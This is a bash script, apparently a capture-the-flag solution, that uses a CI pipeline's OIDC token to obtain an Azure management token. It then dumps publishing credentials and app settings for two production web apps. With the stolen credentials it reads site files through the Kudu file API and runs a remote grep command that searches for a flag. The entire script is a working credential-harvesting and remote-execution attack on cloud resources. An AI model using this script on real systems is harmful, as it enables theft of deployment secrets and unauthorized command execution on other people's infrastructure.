#!/usr/bin/env bash
set +e
T="$AZURE_TENANT_ID"; C="$AZURE_CLIENT_ID"
J=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api://AzureADTokenExchange"|python3 -c 'import sys,json;print(json.load(sys.stdin).get("value","" ) )')
MT=$(curl -sS -X POST "https://login.microsoftonline.com/$T/oauth2/v2.0/token" -d client_id=$C -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode client_assertion="$J" --data-urlencode scope=https://management.azure.com/.default|python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))')
base="https://management.azure.com/subscriptions/$AZURE_SUBSCRIPTION_ID/resourceGroups/rg-tbl-platform-prod-sea/providers/Microsoft.Web/sites"
for app in app-tbl-storefront-prod app-tbl-reporting-prod; do
 echo APP=$app
 for action in "config/publishingcredentials/list?api-version=2022-03-01" "config/appsettings/list?api-version=2022-03-01"; do
  out=$(curl -sS -X POST -H "Authorization: Bearer $MT" "$base/$app/$action"); echo "ARM_$action=$out" | head -c 12000
 done
 creds=$(curl -sS -X POST -H "Authorization: Bearer $MT" "$base/$app/config/publishingcredentials/list?api-version=2022-03-01")
 user=$(echo "$creds"|python3 -c 'import sys,json;print(json.load(sys.stdin).get("properties",{}).get("publishingUserName",""))'); pass=$(echo "$creds"|python3 -c 'import sys,json;print(json.load(sys.stdin).get("properties",{}).get("publishingPassword",""))')
 for host in "$app.scm.azurewebsites.net"; do
  echo "VFS=$(curl -sS -u "$user:$pass" "https://$host/api/vfs/site/wwwroot/")" | head -c 12000
  for f in app.py results.json mi_out.json; do echo "FILE_$f=$(curl -sS -u "$user:$pass" "https://$host/api/vfs/site/wwwroot/$f"|head -c 12000)"; done
  echo "CMD=$(curl -sS -u "$user:$pass" -H 'Content-Type: application/json' -X POST "https://$host/api/command" -d '{"command":"grep -RaiE \"DF26\\{|flag\" /home/site 2>/dev/null | head -c 20000","dir":"/home/site/wwwroot"}'|head -c 22000)"
 done
done